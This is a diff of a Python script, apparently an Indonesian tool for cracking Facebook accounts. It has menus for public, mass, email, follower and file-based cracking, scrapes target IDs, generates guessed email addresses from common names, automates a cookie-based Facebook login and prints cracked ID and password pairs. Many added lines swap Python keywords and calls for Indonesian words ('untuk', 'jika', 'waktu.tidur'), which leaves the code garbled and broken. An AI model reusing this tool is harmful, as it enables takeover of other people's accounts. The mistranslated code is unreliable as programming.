@@ -126,7 +126,7 @@ def uaku():
 M2 = "[#FF0000]" #MERAH
 H2 = "[#00FF00]" #HIJAU
 K2 = "[#FFFF00]" #KUNING
-B2 = "[#00C8FF]" # BIRU
+B2 = "[#00C8FF]" #BIRU
 P2 = "[#FFFFFF]" #PUTIH
 ###---------[ CEK WARNA TEMA ]---------- ###
 mencoba:
@@ -188,13 +188,10 @@ def kembali():
 	Gabung()
 #-----------------[ LOGO-LAKNAT ]-----------------#
 def spanduk():
-	cetak(panel(f""" ______ ___ _____ ___________ _____ _____ _ __
- | ___/ _ \/ __ \| ___| ___ \| _ || _ | | //
- | |_ / /_\ \ / \/| |__ | |_/ /| | | || | | | |/ / | | 
- | _|| _ | | | __|| ___ \| | | || | | | \ | | 
- | | | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\ \ | | 
- \_| \_| |_/\____/\____/\____/ \___/ \___/\_| \_/                                                                                                     
-             """,width=90,title=f"Spanduk",style=f"tebal putih"))
+	cetak(panel(f"""[tebal hijau] ___ ____ ____ _ _ ____ _ _ _ _ _ _
+[hijau tebal] |__] |__/ |__| \_/ |___ |\ | |\ | |\ |
+[hijau tebal] |__] | \ | | | |___ | \| | \| | \|                                                                                                        
+             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
 #-----------------------[BAGIAN-MASUK ]--------------#
 pasti login123():
 	os.system('hapus')
@@ -259,7 +256,7 @@ def login_lagi334():
 					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
 					jika 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' di str(response3.url):
 						r.headers.pop('jenis konten');r.headers.pop('asal')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
+						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).teks
 						tindakan = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
 						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
 						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
@@ -309,8 +306,8 @@ menu def(nama_saya,id_saya):
 	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[ /][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white] User Ip : [bold green]{ip}[/][/]\n[bold white][+[/][bold white]][/] [bold white]User Sc : [bold green]{pengguna}[ /][/] ',width=45,padding=(0,3),style=f"tebal putih"))
 	dia.append(panel(f'[bold putih][+[/][bold putih]][/] [bold putih]Pengarang : [bold hijau]Alvino[/]\n[bold putih][+[/] [putih tebal]][/] [putih tebal]Kode ulang : [hijau tebal]BrayennnXD[/]\n[putih tebal][+[/][putih tebal]][/] [putih tebal]Versi : [hijau tebal] ]3.0[/][/]\n[putih tebal][+[/][putih tebal]][/] [putih tebal]Status : [hijau tebal]Pribadi[/][/] ',lebar=44, padding=(0,3),style=f"tebal putih"))
 	console.print(Kolom(dia))
-	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , XyzonXD , Dapunta , Nazri XD Dan Lainnya",width=90,title=f"[bold green]Thanks To",padding=(0, 5),style=f"putih tebal"))
-	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack Publick OR Friends [[bold green] ON [bold white]] [bold white][[bold cyan]02[bold white]] Crack Nama pengguna [[bold green] ON [bold white]]\n[bold white][[bold cyan]03[bold white]] Crack Massal [[bold green] ON [bold white]] [bold white][[bold cyan ]04[putih tebal]] Retak Email [[tebal hijau] AKTIF [putih tebal]] [putih tebal][[bold cyan]05[putih tebal]] Pengikut Retak [[hijau tebal] AKTIF [putih tebal]] [tebal putih][[bold cyan]06[bold white]] Hasil Cek [[bold green] ON [bold white]]\n[bold white][[bold cyan]07[bold white]] Crack File [[bold green] ON [bold white]] [bold white][[bold cyan]00[bold white]] [bold red]Ganti Cookies [bold white][[bold green] ON [bold white]]",width=90,title= F"[hijau tebal]Menu Daftar",padding=(0,8),style=f"bold putih"))
+	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD Dan Lainnya",width=90,title=f"[bold green]Thanks To",padding=(0, 5),style=f"putih tebal"))
+	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack Publick [[bold green] ON [bold white]] [bold white][[bold cyan]05[bold white]] Crack Nama pengguna [[bold green] ON [bold white]]\n[bold white][[bold cyan]02[bold white]] Crack Massal [[bold green] ON [bold white]] [bold white][[bold cyan ]06[putih tebal]] Retak Email [[tebal hijau] AKTIF [putih tebal]] [putih tebal][[bold cyan]03[putih tebal]] Pengikut Retak [[hijau tebal] AKTIF [putih tebal]] [tebal putih][[bold cyan]07[bold white]] Hasil Cek [[bold green] ON [bold white]]\n[bold white][[bold cyan]04[bold white]] Crack File [[bold green] ON [bold white]] [bold white][[bold cyan]00[bold white]] [bold red]Ganti Cookies [bold white][[bold green] ON [bold white]]",width=90,title= F"[hijau tebal]Menu Daftar",padding=(0,8),style=f"bold putih"))
 	cetak(panel(f' [bold white]Ketik [bold green]"Bot"[bold white] Untuk Ke Menu Tambahan Di Dalam Script Ini',width=90,title=f"[bold green]Informasi Crack",style= f"putih tebal"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
 	jika _____brayennn___xd____ di ['1','01']:
@@ -997,144 +994,144 @@ def crack_nama():
 	pengaturan()
 		
 def cari_nama(tautan):
-	r = parser(ses.get(str(link)).text,'html.parser')
-	for x in r.find_all('td'):
-		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
-		for uid,nama in data:
-			if 'profile.php?' in uid:
+	r = parser(ses.get(str(tautan)).text,'html.parser')
+	untuk x di r.find_all('td'):
+		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\" .*?\">(.*?)<\/div\>',str(x))
+		untuk uid, nama dalam data:
+			jika 'profile.php?' dalam cairan:
 				uid = re.findall('id=(.*)',str(uid))[0]
-			elif '<span' in nama:
+			elif '<span' dalam nama:
 				nama = re.findall('(.*?)\<',str(nama))[0]
 			bo = uid+'|'+nama
-			if bo in id:pass
-			else:id.append(bo)
+			jika bo di id:pass
+			lain: id.append(bo)
 	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
-	if(link):
+	jika (tautan):
 	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
-	  time.sleep(0.0000003)
-	  cari_nama(link)
-	else:
-	     print("\r")
-#-----------------[ CRACK EMAIL ]-----------------#
+	  waktu.tidur(0,0000003)
+	  cari_nama(tautan)
+	kalau tidak:
+	     cetak("\r")
+#-----------------[EMAIL CRACK]-----------------#
 def crack_email():
-	rc = random.choice
-	rr = random.randint
-	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
+	rc = random.pilihan
+	rr = acak.randint
+	xc = ['andi', 'dwi', 'muhammad', 'nur', 'dewi', 'tri', 'dian', 'sri', 'putri', 'eka', 'sari', 'aditya' ,'basuki','budi', 'joni', 'toni', 'cahya', 'riski', 'farhan', 'aden', 'joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
-	global ok , cp
+	global oke, cp
 	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
 	nama = console.input(f' [+] Masukan Nama Target : ')
-	if ',' in str(nama):
+	jika ',' di str(nama):
 		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
-		time.sleep(3);exit()
+		waktu.tidur(3);keluar()
 	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
 	doma = console.input(f' [+] Masukan Nama Domain : ')
-	if '@' not in str(doma) or '.com' not in str(doma):
+	jika '@' tidak di str(doma) atau '.com' tidak di str(doma):
 		print(f" [+] Masukan Domain Dengan Benar")
-		time.sleep(3);exit()
+		waktu.tidur(3);keluar()
 	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
 	jumlah = console.input(f' [+] Total Dump : ')
-	for xyz in range(int(jumlah)):
+	untuk xyz dalam rentang(int(jumlah)):
 		A = nama
-		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
-		C = doma
+		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc( xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(hitam))}{str(rr(0,31))}',f' {str(rc(xc))}{str(rc(hitam))}']
+		C = rumah
 		D = f'{A}{str(rc(B))}{C}'
-		if D in id:pass
-		else:id.append(D+'|'+nama)
-		if len(dump)==999999:setting()
+		jika D di id:pass
+		lain:id.tambahkan(D+'|'+nama)
+		jika len(buang)==999999:pengaturan()
 		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
-		time.sleep(0.0000003)
-	print("\r")
-	setting()	
+		waktu.tidur(0,0000003)
+	cetak("\r")
+	pengaturan()	
 		
-#-----------------[ CRACK FILE ]-----------------#
+#-----------------[CRACK FILE]-----------------#
 def crack_file():
-	try:vin = os.listdir('DUMP')
-	except FileNotFoundError:
+	coba: vin = os.listdir('DUMP')
+	kecuali FileNotFoundError:
 		print(' [+] File Tidak Ditemukan ')
-		time.sleep(2)
-		back()
-	if len(vin)==0:
+		waktu.tidur(2)
+		kembali()
+	jika len(vin)==0:
 		print(' [+] Kamu Tidak Memiliki File Dump ')
-		time.sleep(2)
-		back()
-	else:
+		waktu.tidur(2)
+		kembali()
+	kalau tidak:
 		cih = 0
 		lol = {}
-		for isi in vin:
-			try:hem = open('DUMP/'+isi,'r').readlines()
-			except:continue
+		untuk isi di vin:
+			coba:hem = open('DUMP/'+isi,'r').readlines()
+			kecuali: lanjutkan
 			cih+=1
-			if cih<100:
+			jika cih<100:
 				nom = ''+str(cih)
 				lol.update({str(cih):str(isi)})
 				lol.update({nom:str(isi)})
-				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
-			else:
+				print(f'\n %s.%s ({h} %s{x} idz )'%(nom,isi,len(hem)))
+			kalau tidak:
 				lol.update({str(cih):str(isi)})
-				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
+				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Akun ]'+x)
+				print(' [+] %s.%s ({h} %s {x}idz) '%(cih,isi,len(hem)))
 		geeh = input(' [+] Pilih : ')
-		try:geh = lol[geeh]
-		except KeyError:
+		coba: geh = lol[geeh]
+		kecuali KeyError:
 			print(f' [+] Pilih Yang Bener Kontol {x}')
-			time.sleep(3)
-			back()
-		try:lin = open('DUMP/'+geh,'r').read().splitlines()
-		except:
+			waktu.tidur(3)
+			kembali()
+		coba:lin = open('DUMP/'+geh,'r').read().splitlines()
+		kecuali:
 			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
-			time.sleep(2)
-			back()
-		for xid in lin:
-			id.append(xid)
-		setting()
-#-----------------[ HASIL-CRACK ]-----------------#
-def result():
-	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
+			waktu.tidur(2)
+			kembali()
+		untuk xid di lin:
+			id.tambahkan(xid)
+		pengaturan()
+#-----------------[HASIL-CRACK]------------------#
+hasil def():
+	cetak(panel(f'[bold putih][[bold cyan]01[/][bold putih]][/] [bold putih]Hasil OK[/]\n[bold putih][[bold cyan]02[/ ][putih tebal]][/] [putih tebal]Hasil CP[/]\n[putih tebal]][[bold cyan]03[/][putih tebal]][/] [merah tebal]Kembali[/]' ,width=90,title=f"[bold white]• [/][bold green]Daftar Menu Cek[/][bold white] •[/]",style=f"bold white"))
 	kz = input(f' [+] Pilih : ')
-	if kz in ['2','02']:
-		try:vin = os.listdir('CP')
-		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
-			time.sleep(3)
-			back()
-		if len(vin)==0:
+	jika kz di ['2','02']:
+		coba: vin = os.listdir('CP')
+		kecuali FileNotFoundError:
+			print(' [+] File Tidak Ditemukan ')
+			waktu.tidur(3)
+			kembali()
+		jika len(vin)==0:
 			print(' [+] Anda Tidak Memiliki Hasil CP ')
-			time.sleep(4)
-			back()
-		else:
+			waktu.tidur(4)
+			kembali()
+		kalau tidak:
 			cih = 0
 			lol = {}
-			for isi in vin:
-				try:hem = open('CP/'+isi,'r').readlines()
-				except:continue
+			untuk isi di vin:
+				coba:hem = open('CP/'+isi,'r').readlines()
+				kecuali: lanjutkan
 				cih+=1
-				if cih<10:
+				jika cih<10:
 					nom = '0'+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				else:
+					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Akun ]'+x)
+				kalau tidak:
 					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
-			try:geh = lol[geeh]
-			except KeyError:
+					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Akun ]'+x)
+			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Pilih{x} : ')
+			coba: geh = lol[geeh]
+			kecuali KeyError:
 				print(' [+] Pilih Yang Bener Kontol ')
-				exit()
-			try:lin = open('CP/'+geh,'r').read().splitlines()
-			except:
-				print(' [+] File Tidak Di Temukan ')
-				time.sleep(4)
-				back()
+				KELUAR()
+			coba:lin = open('CP/'+geh,'r').read().splitlines()
+			kecuali:
+				print(' [+] File Tidak Ditemukan ')
+				waktu.tidur(4)
+				kembali()
 			nocp=0
-			for cpku in range(len(lin)):
+			untuk cpku dalam jangkauan(len(lin)):
 				cpkuni=lin[nocp].split('|')
 				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
-				sol().print(mark(cpkuh,style="yellow"))
+				sol().print(mark(cpkuh,style="kuning"))
 				nocp +=1
-			input('[ Klik Enter ]')
-			back()
+			input('[Klik Enter]')
+			kembali()
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
